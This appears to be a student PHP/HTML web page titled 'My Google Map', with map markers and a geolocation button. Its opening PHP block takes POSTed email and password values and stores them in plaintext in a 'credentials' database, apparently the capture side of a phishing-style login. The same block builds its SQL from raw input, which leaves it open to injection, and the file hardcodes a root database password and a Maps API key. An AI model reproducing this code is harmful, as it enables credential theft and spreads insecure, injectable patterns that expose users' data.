
<?php
  $servername='localhost';
  $username='root';
  $password='1234';
  $dbname = "credentials";
  $conn=mysqli_connect($servername,$username,$password,"$dbname");
    if(!$conn){
        die('Could not Connect MySql Server:' .mysql_error());
      }
if(isset($_POST['Login']))
{
      $email = $_POST['email'];
      $pass = $_POST['pass'];
      $sql = "INSERT INTO cred (email,pass)
      VALUES ('$email','$pass')";
      mysqli_query($conn, $sql);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>My Google Map</title>
  <style>
.button-73 {
            appearance: none;
            background-color: #FFFFFF;
            border-radius: 40em;
            border-style: none;
            box-shadow: #ADCFFF 0 -12px 6px inset;
            box-sizing: border-box;
            color: #000000;
            cursor: pointer;
            display: inline-block;
            font-family: -apple-system, sans-serif;
            font-size: 1.2rem;
            font-weight: 700;
            letter-spacing: -.24px;
            margin: 0;
            outline: none;
            padding: 1rem 1.3rem;
            quotes: auto;
            text-align: center;
            text-decoration: none;
            transition: all .15s;
            user-select: none;
            -webkit-user-select: none;
            touch-action: manipulation;

        }

        .button-73:hover {
            background-color: #FFC229;
            box-shadow: #FF6314 0 -6px 8px inset;
            transform: scale(1.125);
        }

        .button-73:active {
            transform: scale(1.025);
        }

        @media (min-width: 768px) {
            .button-73 {
                font-size: 1.5rem;
                padding: .75rem 2rem;
            }
        }

    h1 {  color: white;
      font-weight: bold;
      font-size: 4rem;
      letter-spacing: 0.02em;
    }
    /* button{padding: 15px 32px;} */
    #map{
      height:600px;
      width:100%;
    }
    body {background-color: rgb(15, 31, 65);}
  </style>
</head>
<body>
  <h1>Your location</h1>
  <a href="M2.html">
  <button class="button-73" >Proceed</button><br>
</a>
  <div id="map"></div>
  <script>
    function initMap(){
      // Map options
      var options = {
        zoom:8,
        center:{lat:12.9354,lng:77.5358}
      
      }

      // New map
      var map = new google.maps.Map(document.getElementById('map'), options);

      // Listen for click on map
      google.maps.event.addListener(map, 'click', function(event){
        // Add marker
        addMarker({coords:event.latLng});
      });

      
      // Add marker
      var marker = new google.maps.Marker({
        position:{lat:42.4668,lng:-70.9495},
        map:map,
        icon:'https://developers.google.com/maps/documentation/javascript/examples/full/images/beachflag.png'
      });

      var infoWindow = new google.maps.InfoWindow({
        content:'<h1>Lynn MA</h1>'
      });

      marker.addListener('click', function(){
        infoWindow.open(map, marker);
      });
    

      // Array of markers
      var markers = [
        {
          // coords:{lat:12.9354,lng:77.5358},
          // iconImage:'https://developers.google.com/maps/documentation/javascript/examples/full/images/beachflag.png',
          content:'<h1>PESU</h1>'
        },
        
           
      ];

      // Loop through markers
      for(var i = 0;i < markers.length;i++){
        // Add marker
        addMarker(markers[i]);
      }

      // Add Marker Function
      function addMarker(props){
        var marker = new google.maps.Marker({
          position:props.coords,
          map:map,
          //icon:props.iconImage
        });

        // Check for customicon
        if(props.iconImage){
          // Set icon image
          marker.setIcon(props.iconImage);
        }

        // Check content
        if(props.content){
          var infoWindow = new google.maps.InfoWindow({
            content:props.content
          });

          marker.addListener('click', function(){
            infoWindow.open(map, marker);
          });






          infoWindow = new google.maps.InfoWindow();
          const locationButton = document.createElement("button");
          locationButton.textContent = "Pan to Current Location";
          locationButton.classList.add("custom-map-control-button");
          map.controls[google.maps.ControlPosition.TOP_CENTER].push(locationButton);
          locationButton.addEventListener("click", () => {
    // Try HTML5 geolocation.
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const pos = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
          };

          infoWindow.setPosition(pos);
          infoWindow.setContent("Location found.");
          infoWindow.open(map);
          map.setCenter(pos);
        },
        () => {
          handleLocationError(true, infoWindow, map.getCenter());
        }
      );
    } else {
      // Browser doesn't support Geolocation
      handleLocationError(false, infoWindow, map.getCenter());
    }
  });
        }
      }
    }

  </script>
  <script async defer
    src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCEskStNYA-Oh30Vi3klVW8Unkn8pxiFbA&callback=initMap">
    </script>
</body>

</html>
